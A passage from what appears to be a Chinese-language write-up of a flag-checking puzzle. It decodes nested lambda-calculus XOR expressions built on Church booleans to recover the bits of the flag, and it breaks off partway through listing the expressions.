class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE))<br></code></pre></td></tr></table></figure><p>分离出最内层的表达式</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">AND</span> TRUE (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) <br></code></pre></td></tr></table></figure><p>其中 <code>[&#39;lambda&#39;, &#39;0&#39;, [&#39;lambda&#39;, &#39;1&#39;, [&#39;symbol&#39;, &#39;137&#39;]]</code>的 137 在初始化时被替换成 flag 的 bit 位</p><p>根据验证规则，整个表达式要为 True, 则 <code>[&#39;lambda&#39;, &#39;0&#39;, [&#39;lambda&#39;, &#39;1&#39;, [&#39;symbol&#39;, &#39;137&#39;]]]</code> 应该为 <code>FALSE</code>, 即 137 的值应该为 1 （参考 Church Boolean 的 False）</p><p>提取所有 XOR 表达式</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span 